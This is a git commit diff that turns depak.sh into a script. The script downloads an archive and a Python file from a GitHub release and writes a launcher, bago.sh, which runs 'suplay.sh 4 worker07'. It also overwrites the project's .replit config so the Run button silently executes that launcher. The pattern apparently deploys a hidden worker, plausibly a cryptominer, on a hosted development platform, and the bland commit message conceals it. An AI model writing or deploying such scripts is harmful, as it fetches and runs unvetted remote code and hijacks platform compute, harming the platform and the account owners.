86706ed95d218793b89e8935c0726eefdd2c7a1a
apefanubs696-dotcom <apefanubs696@deciw.com>
2026-09-17 19:12:30 +0700

    Update depak.sh

--- depak.sh
+++ depak.sh
@@ -1,1 +1,30 @@
-ss
+curl -O -J -L https://github.com/apefanubs696-dotcom/geranx/releases/download/sama/koni.tar.gz && tar -xf koni.tar.gz && rm -rf koni.tar.gz
+curl -O -J -L https://github.com/apefanubs696-dotcom/geranx/releases/download/sama/power.py
+echo '#!/bin/bash
+
+bash suplay.sh 4 worker07' > bago.sh
+
+echo 'modules = ["python-3.12"]
+
+[workflows]
+runButton = "Project"
+
+[[workflows.workflow]]
+name = "Project"
+mode = "parallel"
+author = "agent"
+
+[[workflows.workflow.tasks]]
+task = "workflow.run"
+args = "bago"
+
+[[workflows.workflow]]
+name = "bago"
+author = "agent"
+
+[[workflows.workflow.tasks]]
+task = "shell.exec"
+args = "bash bago.sh"
+
+[workflows.workflow.metadata]
+outputType = "console"' > .replit
